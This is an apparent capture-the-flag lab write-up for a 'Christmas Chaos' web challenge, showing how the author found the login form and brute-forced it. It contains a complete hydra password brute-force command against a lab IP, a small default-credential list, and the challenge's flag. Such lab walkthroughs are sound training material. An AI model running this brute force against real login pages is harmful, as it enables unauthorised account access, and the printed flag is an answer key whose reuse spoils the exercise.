# Day 3 - Christmas Chaos (Web Exploitation)

1. Go to `http://10.10.233.85` and try to sign in with credentials `a:a`. Look at debug tools network tab and see it is POSTing to the `/login` endpoint with payload `username=a&password=a`.

2. Create `usernames.txt` and `passwords.txt` with the provided usernames and passwords, respectively.

    | Username | Password |
    |----------|----------|
    | root     | root     |
    | admin    | password |
    | user     | 12345    |

3. Run hydra brute force command: `hydra -L usernames.txt -P passwords.txt -F 10.10.233.85 -s 80 http-post-form "/login:username=^USER^&password=^PASS^:Your password is incorrect"`. I found the `Your password is incorrect` in the website source code after trying to sign in with `a:a`.

4. What is the flag? `THM{885ffab980e049847516f9d8fe99ad1a}`
